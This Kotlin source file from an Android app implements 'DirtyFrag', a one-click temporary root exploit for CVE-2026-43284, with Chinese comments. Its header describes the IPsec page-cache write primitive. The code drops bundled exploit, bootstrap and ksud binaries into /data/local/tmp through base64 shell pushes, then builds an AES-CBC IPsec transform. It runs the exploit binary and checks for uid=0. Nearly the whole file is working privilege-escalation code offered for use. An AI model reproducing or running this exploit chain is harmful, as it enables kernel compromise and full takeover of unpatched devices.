package com.codefox.paperlite.core

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom

/**
 * DirtyFrag 一键 root（CVE-2026-43284）。
 *
 * 原理：内核对 IPsec ESP 包做 AES-CBC 解密时直接落到文件页缓存，
 * 构造 `IV = AES_ECB_DEC(key, 当前内容) ⊕ 目标内容` 就能无写权限改写
 * 任意 16 字节对齐的映射库内容。实现移植自 diabl0w/DFRoot（GPL-2.0）。
 *
 * 前提：Android 12+、内核未回补该漏洞、开发者选项的日志缓冲区不能关闭。
 * su 守护进程（ksud）由 PaperLite 随包自带，不再要求用户先装 KernelSU 系管理器。
 * 这是内存态临时 root，重启即失效。
 */
object DirtyFrag {

    private const val TAG = "DirtyFrag"

    /** DFRoot 的判断标志：内核里已经挂上模块了。 */
    private const val HOOK_MARKER = "/dev/df"

    /** 载荷在 assets 里的位置。 */
    private const val ASSET_DIR = "dfroot"

    /** 运行结果。 */
    data class Result(
        val success: Boolean,
        val message: String,
        val log: List<String> = emptyList(),
    )

    /**
     * 当前这台设备是否具备跑利用的条件。
     *
     * ksud 来自本应用 assets（[BundledBinaries.ksud]），
     * 所以不需要再扫描设备上装了哪个 SU 管理器——
     * 旧版那条路要求用户先装 SukiSU/KernelSU，装的还是哪个版本都不确定。
     */
    fun supportInfo(context: Context): String {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return "系统版本过低（需要 Android 12 / API 31 以上）"
        }
        if (File(HOOK_MARKER).exists()) {
            return "内核模块已加载（/dev/df 存在），root 生效中"
        }
        if (!BundledBinaries.hasKsud(context)) {
            return "本机架构（${BundledBinaries.abi(context)}）没有随包内置的 ksud"
        }
        // 与 DFRoot 相同的检查：日志缓冲区关掉会拿不到内核日志
        val logTag = runCatching {
            Class.forName("android.os.SystemProperties")
                .getMethod("get", String::class.java, String::class.java)
                .invoke(null, "persist.log.tag", "") as? String
        }.getOrNull().orEmpty()
        if (logTag.isNotEmpty() && logTag.uppercase().startsWith("S")) {
            return "开发者选项里的「日志缓冲区大小」被关掉了，改成其它值才能提权"
        }
        return "可提权：已内置 ${BundledBinaries.abi(context)} 架构的 ksud"
    }

    /**
     * 执行提权。
     *
     * @param onLog 每行日志回调，用于在界面上实时显示
     */
    suspend fun run(
        context: Context,
        channels: ChannelManager,
        onLog: (String) -> Unit = {},
    ): Result = withContext(Dispatchers.IO) {
        val logs = ArrayList<String>()

        fun log(line: String) {
            logs += line
            onLog(line)
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return@withContext Result(false, "系统版本过低（需要 Android 12 以上）", logs)
        }
        if (File(HOOK_MARKER).exists()) {
            return@withContext Result(true, "内核模块已加载，无需重复提权", logs)
        }

        log("* PaperLite · DirtyFrag (CVE-2026-43284)")
        log("* 设备：${Build.MANUFACTURER} ${Build.MODEL}")
        log("* 系统：Android ${Build.VERSION.RELEASE}（API ${Build.VERSION.SDK_INT}）")
        log("* 内核：${System.getProperty("os.version", "未知")}")
        log("* 安全补丁：${Build.VERSION.SECURITY_PATCH}")

        // 载荷要落到 /data/local/tmp：普通应用写不了那里，
        // 需要 shell（无线调试会话）或 root 身份来投放。
        val shellReady = channels.acquireShellIdentity()
        if (!shellReady) {
            return@withContext Result(
                false,
                "没有 shell 身份，无法把载荷投放到 /data/local/tmp。" +
                    "请先在「超级用户」页完成无线调试配对，或用带 root 的设备",
                logs,
            )
        }

        // 1. 取出利用程序本体（留在应用私有目录，本进程直接执行）
        val exploitBin = extractAsset(context, "$ASSET_DIR/libdfroot.so", File(context.filesDir, "libdfroot.so"))
        if (exploitBin == null) {
            return@withContext Result(false, "缺少载荷 libdfroot.so（打包时没有带上 assets/dfroot）", logs)
        }

        // 2. 取出 bootstrap（由内核以 uid 0 拉起，必须在它读得到的地方）
        val bootstrapBytes = readAsset(context, "$ASSET_DIR/libbootstrap.so")
            ?: return@withContext Result(false, "缺少载荷 libbootstrap.so", logs)
        if (!pushBinary(channels, bootstrapBytes, DirtyFragPatcher.BOOTSTRAP_PATH) { line -> log(line) }) {
            return@withContext Result(false, "bootstrap 投放失败", logs)
        }

        // 3. 投放随包自带的 ksud（按本机 ABI 选）
        //    旧版是去已安装的 SU 管理器 nativeLibraryDir 里借 libksud.so，
        //    没装管理器就整个流程卡死；现在组件随包走，不依赖用户环境。
        val (ksudBytes, ksudAbi) = BundledBinaries.ksud(context)
            ?: return@withContext Result(
                false,
                "本机架构没有随包内置的 ksud（${BundledBinaries.abi(context)}）",
                logs,
            )
        if (!pushBinary(channels, ksudBytes, DirtyFragPatcher.KSUD_PATH) { line -> log(line) }) {
            return@withContext Result(false, "ksud 投放失败", logs)
        }
        log("* ksud：随包内置（$ksudAbi，${ksudBytes.size} 字节）")

        // 4. 写 SU 管理器偏好：bootstrap 从这里读出包名，
        //    再以 `ksud --package-name <pkg>` 把守护进程拉起来。
        //    包名与内置 ksud 的来源（SukiSU）保持一致。
        val prefs = "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n" +
            "<map>\n    <string name=\"su_manager\">${BundledBinaries.KSUD_PACKAGE}</string>\n</map>\n"
        val prefsB64 = android.util.Base64.encodeToString(
            prefs.toByteArray(Charsets.UTF_8),
            android.util.Base64.NO_WRAP,
        )
        val w = channels.execAsShell(
            "echo '$prefsB64' | base64 -d > ${DirtyFragPatcher.PREFS_PATH} && " +
                "chmod 644 ${DirtyFragPatcher.PREFS_PATH}",
            timeoutMs = 30_000L,
        )
        if (!w.ok) {
            return@withContext Result(false, "写入 SU 管理器偏好失败：${w.error ?: w.output}", logs)
        }

        // 5. IPsec 传输模式 transform
        val ipSecManager = context.getSystemService("ipsec") as? IpSecManager
            ?: return@withContext Result(false, "系统没有 IpSecManager", logs)

        var udpSocket: IpSecManager.UdpEncapsulationSocket? = null
        var spi: IpSecManager.SecurityParameterIndex? = null
        var transform: IpSecTransform? = null
        try {
            udpSocket = ipSecManager.openUdpEncapsulationSocket()
            val address = InetAddress.getByName("127.0.0.1")
            spi = ipSecManager.allocateSecurityParameterIndex(address)

            val key = ByteArray(32)
            SecureRandom().nextBytes(key)

            // 借用一个临时 UDP 套接字拿本地端口，用完即关
            val senderPort = DatagramSocket().use { it.localPort }

            transform = IpSecTransform.Builder(context)
                .setEncryption(IpSecAlgorithm("cbc(aes)", key))
                .setIpv4Encapsulation(udpSocket, senderPort)
                .buildTransportModeTransform(address, spi)
            log("* IPsec transform 已就绪（SPI ${spi.spi}）")

            // 6. 跑利用程序
            val hexKey = key.joinToString("") { "%02x".format(it) }
            val cmd = listOf(
                exploitBin.absolutePath,
                "--encap-port", udpSocket.port.toString(),
                "--sender-port", senderPort.toString(),
                "--spi", Integer.toUnsignedString(spi.spi),
                "--aes-key", hexKey,
            )
            log("* 执行利用链…")
            val p = ProcessBuilder(cmd).redirectErrorStream(true).start()
            p.inputStream.bufferedReader().use { reader ->
                while (true) {
                    val line = reader.readLine() ?: break
                    log(line)
                }
            }
            val code = p.waitFor()
            when {
                File(HOOK_MARKER).exists() -> {
                    log("* 内核模块已挂载（/dev/df 存在）")
                    // 校验：现在应该能拿到 root
                    val probe = channels.execAsShell("id 2>/dev/null", timeoutMs = 20_000L)
                    if (probe.ok && probe.output.contains("uid=0")) {
                        log("* 校验通过：${probe.output.trim().lines().firstOrNull()}")
                        Result(true, "提权成功，已获得 root", logs)
                    } else {
                        log("* 模块已挂载，但还没拿到 su 权限")
                        Result(true, "内核模块已加载，等待 SU 管理器接管 su", logs)
                    }
                }

                code == 0 -> {
                    log("* 利用程序正常退出")
                    Result(true, "利用已执行，请检查 root 状态", logs)
                }

                else -> {
                    Log.w(TAG, "dirtyfrag exit=$code")
                    Result(false, interpretFailure(logs), logs)
                }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "dirtyfrag failed", t)
            Result(false, "提权过程出错：${t.message ?: t::class.java.simpleName}", logs)
        } finally {
            runCatching { transform?.close() }
            runCatching { spi?.close() }
            runCatching { udpSocket?.close() }
        }
    }

    /**
     * 把利用程序输出的关键行翻译成界面能直接给用户看的中文结论。
     *
     * 原生程序（DFRoot）用英文打 marker，这里只做关键字匹配，
     * 不改动任何利用逻辑；目的是让「不可利用」这类确定性失败
     * 给出可执行建议，而不是一句含糊的「退出码 N」。
     */
    private fun interpretFailure(logs: List<String>): String {
        val text = logs.joinToString("\n")
        return when {
            text.contains("DEVICE NOT VULNERABLE", ignoreCase = true) ->
                "本设备不可利用：内核/系统已修补 DirtyFrag 路径（APEX 只读、" +
                "IPsec 页缓存写原语被回补）。建议改用解锁 Bootloader + KernelSU，" +
                "或换一台 Android 12+ 且内核未回补的设备。"

            text.contains("verification failed", ignoreCase = true) ||
                text.contains("failed to patch files", ignoreCase = true) ->
                "利用原语未生效（写校验未通过）：目标文件在该系统上不可改写，" +
                "设备大概率已修补此漏洞。"

            else -> "利用未成功（利用程序异常退出，详见下方日志）"
        }
    }

    /**
     * 把一个二进制文件推到设备上并加上可执行权限。
     *
     * 走 shell 通道（root / 无线调试 / 本地回环），
     * 用 base64 分块传输——shell 里直接写二进制会被解释掉。
     */
    private suspend fun pushBinary(
        channels: ChannelManager,
        bytes: ByteArray,
        remote: String,
        log: (String) -> Unit,
    ): Boolean {        val chunk = 96 * 1024
        val init = channels.execAsShell(": > '$remote'", timeoutMs = 30_000L)
        if (!init.ok) {
            log("* 投放 $remote 失败：${init.error ?: init.output}")
            return false
        }
        var offset = 0
        while (offset < bytes.size) {
            val end = minOf(offset + chunk, bytes.size)
            val slice = bytes.copyOfRange(offset, end)
            val b64 = android.util.Base64.encodeToString(slice, android.util.Base64.NO_WRAP)
            val r = channels.execAsShell(
                "echo '$b64' | base64 -d >> '$remote'",
                timeoutMs = 60_000L,
            )
            if (!r.ok) {
                log("* 投放 $remote 失败（分块 $offset）")
                return false
            }
            offset = end
        }
        val chmod = channels.execAsShell("chmod 755 '$remote' && ls -l '$remote'", timeoutMs = 30_000L)
        if (!chmod.ok) {
            log("* 设置 $remote 可执行权限失败")
            return false
        }
        log("* 已投放 $remote（${bytes.size} 字节）")
        return true
    }

    /** 读取 assets 里的载荷。 */
    private fun readAsset(context: Context, asset: String): ByteArray? = runCatching {
        context.assets.open(asset).use { input -> input.readBytes() }
    }.getOrNull()

    /** 把 assets 里的载荷取出来并加上可执行权限。 */
    private fun extractAsset(context: Context, asset: String, target: File): File? = runCatching {
        context.assets.open(asset).use { input ->
            target.outputStream().use { output -> input.copyTo(output) }
        }
        target.setExecutable(true, false)
        if (target.canExecute()) target else null
    }.getOrNull()
}
